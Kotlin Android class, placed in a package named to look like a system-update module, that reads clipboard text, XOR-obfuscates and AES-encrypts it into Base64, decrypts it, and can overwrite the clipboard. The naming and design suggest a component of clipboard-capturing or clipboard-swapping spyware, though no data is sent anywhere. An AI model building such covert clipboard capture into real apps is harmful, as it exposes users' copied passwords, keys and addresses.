package com.system.updates.modules

import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.util.Base64
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

class ClipboardMonitor {
    private val r = SecureRandom()
    private val mask = byteArrayOf(0x5C, 0x6D, 0x7E, 0x8F.toByte(), 0x90.toByte(), 0xA1.toByte(), 0xB2.toByte(), 0xC3.toByte())

    private fun xor(data: ByteArray): ByteArray {
        return data.mapIndexed { i, b -> (b.toInt() xor mask[i % mask.size].toInt() xor i).toByte() }.toByteArray()
    }

    private fun aesEnc(data: ByteArray, key: ByteArray): ByteArray {
        val c = Cipher.getInstance("AES/GCM/NoPadding")
        val iv = ByteArray(12).also { r.nextBytes(it) }
        val ks = SecretKeySpec(key, "AES")
        c.init(Cipher.ENCRYPT_MODE, ks, GCMParameterSpec(128, iv))
        return iv + c.doFinal(data)
    }

    private fun aesDec(enc: ByteArray, key: ByteArray): ByteArray {
        val c = Cipher.getInstance("AES/GCM/NoPadding")
        val iv = enc.sliceArray(0..11)
        val ct = enc.sliceArray(12 until enc.size)
        val ks = SecretKeySpec(key, "AES")
        c.init(Cipher.DECRYPT_MODE, ks, GCMParameterSpec(128, iv))
        return c.doFinal(ct)
    }

    fun getClipboardText(ctx: Context): String? {
        val clipboard = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        val clip = clipboard.primaryClip
        if (clip != null && clip.itemCount > 0) {
            return clip.getItemAt(0).text.toString()
        }
        return null
    }

    fun watchAndEncrypt(ctx: Context, key: ByteArray): String? {
        val text = getClipboardText(ctx) ?: return null
        val raw = text.toByteArray()
        val x = xor(raw)
        val enc = aesEnc(x, key)
        return Base64.encodeToString(enc, Base64.NO_WRAP)
    }

    fun decryptClipboard(encrypted: String, key: ByteArray): String {
        val enc = Base64.decode(encrypted, Base64.NO_WRAP)
        val dec = aesDec(enc, key)
        val plain = xor(dec)
        return String(plain)
    }

    fun setClipboard(ctx: Context, text: String) {
        val clipboard = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        val clip = ClipData.newPlainText("label", text)
        clipboard.setPrimaryClip(clip)
    }
}